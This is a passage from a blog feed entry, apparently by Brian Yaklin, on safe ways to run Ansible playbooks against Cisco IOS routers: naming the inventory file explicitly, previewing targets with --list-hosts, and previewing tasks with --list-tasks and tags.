          &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;snmp-server community {{ snmp.community }} ro SNMP_ACL&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;no_log&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;True&lt;/span&gt;

    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Configure SNMP ACL&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;tags&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;snmp&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;ios_config&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
          &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;permit {{ item }}&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;parents&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
          &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;ip access-list standard SNMP_ACL&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;loop&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;snmp.servers&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}}&quot;&lt;/span&gt;

    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Configure Local Accounts&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;tags&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;users&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;ios_config&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;lines&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
          &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;username {{ item.username }} secret {{ item.password }}&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;loop&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;{{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s&quot;&gt;}}&quot;&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;no_log&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;True&lt;/span&gt;

    &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;Save configuration&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;tags&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;pi&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;save&lt;/span&gt;
      &lt;span class=&quot;na&quot;&gt;ios_config&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;na&quot;&gt;save_when&lt;/span&gt;&lt;span class=&quot;pi&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;modified&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;best-practice--1---manually-specifying-inventory-file&quot;&gt;Best Practice # 1 - Manually specifying inventory file&lt;/h2&gt;

&lt;p&gt;There are multiple ways for the ansible-playbook command to find an inventory file to execute against. This can be through the use of the ANSIBLE_INVENTORY variable, the default location of inventory/hosts.yml, by using the -i flag on the ansible-playbook command, dynamic inventory scripts, etc. With many different methods of defining your inventory, I find the safest method is to manually and explicitly identify it when executing a playbook. This ensures that if you created an inventory file for a specific change you are implementing, there is no chance of ansible-playbook picking up a different inventory file through one of the other methods. This will help you avoid uninentional changes being executed against devices unrelated to your change.&lt;/p&gt;

&lt;p&gt;In my example folder structure there are two inventory files, but the one that I want to execute my playbook against is ios_routers.yml. To specify this I use the -i flag with the ansible-playbook command:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;byaklin@ansiblevm:~/ansible-example&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls &lt;/span&gt;inventory/
hosts.yml  ios_routers.yml
byaklin@ansiblevm:~/ansible-example&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ansible-playbook test-pb.yml &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; inventory/ios_routers.yml
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the words of &lt;a href=&quot;https://www.python.org/dev/peps/pep-0020/&quot;&gt;The Zen of Python&lt;/a&gt;, &lt;strong&gt;Explicit is better than implicit&lt;/strong&gt;.&lt;/p&gt;

&lt;h2 id=&quot;best-practice--2---using-the-ansible-playbook-list-hosts-flag&quot;&gt;Best Practice # 2 - Using the ansible-playbook list-hosts flag&lt;/h2&gt;

&lt;p&gt;In addition to manually specifying the inventory file you want to execute your playbook against, there are often times where you may wish to only run the playbook against a subset of hosts in that inventory. Perhaps you have one master inventory file and you execute your playbooks against a particular group, or a host pattern. To confirm that you are running your playbook against the specific intended hosts, you can use the –list-hosts flag to confirm before execution that Ansible has found the correct hosts.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;You get extra bonus points if your organization has a well defined host naming convention for your network devices. Naming conventions are super helpful in conveying context, such as location or function, and can help in allowing you to use simple pattern matching with your Ansible playbooks.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;When using the –list-hosts flag your playbook will not actually be executed. This gives you an opportunity to examine the returned hosts to confirm they are correct, before executing your playbook against them (by removing the –list-hosts flag):&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;byaklin@ansiblevm:~/ansible-example&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ansible-playbook test-pb.yml &lt;span class=&quot;nt&quot;&gt;--list-hosts&lt;/span&gt;

playbook: test-pb.yml

  play &lt;span class=&quot;c&quot;&gt;#1 (ios): ios	TAGS: []&lt;/span&gt;
    pattern: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;ios&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
    hosts &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
      RouterA
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the above command I forgot to specify my inventory file with the -i flag. However, by using the –list-hosts flag it allowed me to spot that I was missing RouterB in the hosts that would be included as part of Play #1. I now realize my mistake, specify the host file manually and re-run my check with the –list-hosts flag to confirm that both RouterA and RouterB are now identified:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;byaklin@ansiblevm:~/ansible-example&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ansible-playbook test-pb.yml &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; inventory/ios_routers.yml &lt;span class=&quot;nt&quot;&gt;--list-hosts&lt;/span&gt;

playbook: test-pb.yml

  play &lt;span class=&quot;c&quot;&gt;#1 (ios): ios	TAGS: []&lt;/span&gt;
    pattern: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;ios&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
    hosts &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
      RouterB
      RouterA
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Finally, as one last example, if I only wanted to execute a playbook against a subset of my inventory by using a pattern, I can use the –list-hosts flag to ensure that my pattern is correct. In this case I only want to execute the playbook against the RouterB host.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;byaklin@ansiblevm:~/ansible-example&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ansible-playbook test-pb.yml &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; inventory/ios_routers.yml &lt;span class=&quot;nt&quot;&gt;--limit&lt;/span&gt; RouterB &lt;span class=&quot;nt&quot;&gt;--list-hosts&lt;/span&gt;

playbook: test-pb.yml

  play &lt;span class=&quot;c&quot;&gt;#1 (ios): ios	TAGS: []&lt;/span&gt;
    pattern: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;ios&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
    hosts &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
      RouterB
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;best-practice--3---using-the-ansible-playbook-list-tasks-flag&quot;&gt;Best Practice # 3 - Using the ansible-playbook –list-tasks flag&lt;/h2&gt;

&lt;p&gt;It is possible to have dozens of tasks (or more!) included in a playbook, and these can be included through separate task files, roles, etc. Depending on the purpose of your playbook and the automation that you might want to execute you may only want to implement a subset of the tasks. The ansible-playbook –list-tasks flag allows you to see which tasks will be executed. Like the –list-hosts flag previously covered, the –list-tasks flag will not actually execute your playbook. It allows you to see what will be executed, confirm it is as expected, and then you remove the flag and implement your changes.&lt;/p&gt;

&lt;p&gt;To start, lets run the –list-tasks flag against our test-pb.yml. You can see below that we have 10 tasks, some of which are related (see the TAGS values).&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;byaklin@ansiblevm:~/ansible-example&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ansible-playbook test-pb.yml &lt;span class=&quot;nt&quot;&gt;--list-tasks&lt;/span&gt;

playbook: test-pb.yml

  play &lt;span class=&quot;c&quot;&gt;#1 (ios): ios	TAGS: []&lt;/span&gt;
    tasks:
      Configure banner	TAGS: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;banner]
      Remove MOTD banner	TAGS: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;banner]
      Remove EXEC banner	TAGS: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;banner]
      Remove incoming banner	TAGS: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;banner]
      Confure logging hosts	TAGS: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;logging]
      Adjust &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;logging buffer	TAGS: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;logging]
      Configure SNMP	TAGS: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;snmp]
      Configure SNMP ACL	TAGS: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;snmp]
      Configure Local Accounts	TAGS: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
      Save configuration	TAGS: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;save]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;Providing meaningful names to your tasks is very important. It helps you and anyone else using your playbook know what each task is going to do without having to read through the playbook task by task. It also helps everyone use the –list-tasks flag effectively&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;As an example, perhaps your organization just updated its device banner standards and only wants to run those tasks. Although Ansible tasks and modules are intended to be idempotent (only making changes when necessary and if needed), which means you could run all tasks and only the changes that are necessary (the banner) would be executed, it could drastically extend the amount of time the playbook tasks to execute. This is because Ansible needs to validate if each task needs to be executed, before actually implementing it. Instead, if you know that you only want to update the banner, you can use the -t flag to specify the &lt;strong&gt;banner&lt;/strong&gt; tag I have associated with each of those tasks. But how do you know that you didn’t make a mistake when creating or specifying that tag? By using the –list-tasks flag:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;byaklin@ansiblevm:~/ansible-example&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ansible-playbook test-pb.yml &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; banner,save &lt;span class=&quot;nt&quot;&gt;--list-tasks&lt;/span&gt;

playbook: test-pb.yml

  play &lt;span class=&quot;c&quot;&gt;#1 (ios): ios	TAGS: []&lt;/span&gt;
    tasks:
      Configure banner	TAGS: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;banner]
      Remove MOTD banner	TAGS: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;banner]
      Remove EXEC banner	TAGS: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;banner]
      Remove incoming banner	TAGS: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;banner]
      Save configuration	TAGS: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;save]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Now we can see that only the tasks specific to updating the banner will be executed.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;I also have a specific task for saving the configuration (using the &lt;strong&gt;save&lt;/strong&gt; tag). This helps ensure that if changes are made that they will be saved to the startup-configuration. Not all Ansible Cisco modules will do this by default (or even have the option), so instead of writing the &lt;strong&gt;save_when&lt;/strong&gt; option on each of my tasks, I include it at the end of my playbook.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;tying-it-all-together&quot;&gt;Tying it all together&lt;/h2&gt;

&lt;p&gt;It turns out that you can use both the –list-hosts and –list-tasks flags at the same time. This allows you to validate that both the inventory and the expected tasks are correct, before you implement. The below output shows you both the hosts that were identified (in my case RouterB) and the specific tasks (banner updates, and saving the configuration):&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;byaklin@ansiblevm:~/ansible-example&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ansible-playbook test-pb.yml &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; inventory/ios_routers.yml &lt;span class=&quot;nt&quot;&gt;--limit&lt;/span&gt; RouterB &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; banner,save &lt;span class=&quot;nt&quot;&gt;--list-tasks&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--list-hosts&lt;/span&gt;

playbook: test-pb.yml

  play &lt;span class=&quot;c&quot;&gt;#1 (ios): ios	TAGS: []&lt;/span&gt;
    pattern: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;ios&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
    hosts &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:
      RouterB
    tasks:
      Configure banner	TAGS: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;banner]
      Remove MOTD banner	TAGS: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;banner]
      Remove EXEC banner	TAGS: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;banner]
      Remove incoming banner	TAGS: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;banner]
      Save configuration	TAGS: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;save]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Whenever I go to implement an automation using Ansible, before executing the playbook I use these options to validate that everything is as I expect it to be. I also log this information to a file and save it as part of my pre-change information gathering attached to a change record. This is to help cover myself should any unrelated issues pop-up in the network infrastructure. It’s a bit of a CYA, and by showing your customers and management that you are using best practices for first verifying your playbooks (in addition to all the testing you did you with your playbook in a lab environment!), you will gain the confidence and trust from your stakeholders. This helps further promote using automation as part of your job, if you can demonstrate it being done in a safe way.&lt;/p&gt;</content><author><name>Brian Yaklin</name></author><category term="Automation" /><category term="Ansible" /><summary type="html">Ansible can be a very powerful automation tool, allowing you to interact with hundreds or thousands of network devices at once. The automation is defined through a combination of inventory files, variable files, and playbooks (with optional task files and roles). The combination of these features makes a very powerful automation tool, but with that comes a high-level of risk. In this guide I highlight a few best practices to follow when executing Ansible playbooks. By following these best practices you will have increased confidence that you are implementing the correct tasks against the correct set of devices, and avoid any surprises!</summary></entry></feed>